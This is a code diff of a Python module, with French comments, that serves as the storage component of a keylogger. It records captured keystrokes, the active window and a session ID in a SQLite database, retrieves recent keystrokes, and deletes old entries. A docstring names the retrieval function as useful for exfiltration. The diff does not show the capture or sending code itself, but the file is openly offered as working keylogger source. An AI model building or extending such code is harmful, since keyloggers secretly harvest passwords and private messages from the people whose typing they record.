@@ -1,45 +1,96 @@
+# ============================================================
+#  logger.py — Stockage des frappes en base SQLite
+#  Dépendances : aucune (sqlite3 est natif Python)
+# ============================================================
+
 import sqlite3
 import uuid
 from datetime import datetime
-from listener import flush_buffer, last_timestamp
-DB_PATH = "keylogs.db"
 
-#_____variables globales pour le buffer et le timestamp____________________________________________
-key_data = flush_buffer()
-ts = last_timestamp
-window = "Window1" #temporaire a remplacer pars variable
+# ── CONFIG ───────────────────────────────────────────────────
+DB_FILE = "keylog.db"
 
+# Un identifiant unique par lancement du programme
+# Permet de distinguer les sessions dans la base
 SESSION_ID = str(uuid.uuid4())[:8]
 
-#___________________________________________________________creation de la table_____________________________________________
-def create_table():
-    with sqlite3.connect(DB_PATH) as cur:
-        cur.execute(""" CREATE TABLE IF NOT EXISTS keylogs(
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        timestamp TEXT,
-        key TEXT,
-        window TEXT,
-        session_id TEXT DEFAULT 'user_session'         
+
+# ── INIT BASE ────────────────────────────────────────────────
+def init_db():
+    """
+    Crée la base et la table si elles n'existent pas.
+    À appeler une seule fois au démarrage.
+    """
+    with sqlite3.connect(DB_FILE) as conn:
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS keystrokes (
+                id         INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp  TEXT    NOT NULL,
+                key        TEXT    NOT NULL,
+                window     TEXT,
+                session_id TEXT    NOT NULL
             )
         """)
-        cur.commit()
+        conn.commit()
 
-#___________________________________________________________ insertion de données____________________________________________
 
-def insert_data(timestamp, key, window, session_id):
-    with sqlite3.connect(DB_PATH) as cur:
-            cur.execute("INSERT INTO keylogs(timestamp, key, window, session_id) VALUES (?, ?, ?, ?)", (timestamp, key, window, session_id))
-            cur.commit()
+# ── INSERTION ────────────────────────────────────────────────
+def log_key(key, window="unknown"):
+    """
+    Insère une frappe en base.
 
-#____________________________________________________________execution du code____________________________________________
-create_table()
+    Paramètres :
+        key    — la touche capturée  ex: 'a', '[enter]'
+        window — fenêtre active      ex: 'Firefox', 'VSCode'
+    """
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-# netoyage
+    with sqlite3.connect(DB_FILE) as conn:
+        conn.execute(
+            "INSERT INTO keystrokes (timestamp, key, window, session_id) VALUES (?, ?, ?, ?)",
+            (timestamp, key, window, SESSION_ID)
+        )
+        conn.commit()
 
+
+# ── LECTURE ──────────────────────────────────────────────────
+def get_last(n=50):
+    """
+    Retourne les n dernières frappes.
+    Utile pour l'exfiltration ou le debug.
+    """
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.execute(
+            "SELECT timestamp, key, window FROM keystrokes ORDER BY id DESC LIMIT ?",
+            (n,)
+        )
+        return cursor.fetchall()
+
+
+# ── NETTOYAGE ────────────────────────────────────────────────
 def clear_old(days=7):
-    with sqlite3.connect(DB_PATH) as con:
-        con.execute(
-            "DELETE FROM keylogs WHERE timestamp < datetime('now', ?)",
+    """
+    Supprime les entrées de plus de X jours.
+    Évite que la base grossisse indéfiniment.
+    """
+    with sqlite3.connect(DB_FILE) as conn:
+        conn.execute(
+            "DELETE FROM keystrokes WHERE timestamp < datetime('now', ?)",
             (f"-{days} days",)
         )
-        con.commit()
+        conn.commit()
+
+
+# ── TEST STANDALONE ──────────────────────────────────────────
+if __name__ == "__main__":
+    init_db()
+
+    # Simulation de quelques frappes
+    log_key("h", "VSCode")
+    log_key("e", "VSCode")
+    log_key("l", "VSCode")
+    log_key("[enter]", "VSCode")
+
+    print("Dernières frappes enregistrées :")
+    for row in get_last(10):
+        print(f"  [{row[0]}] {row[2]} → {row[1]}")
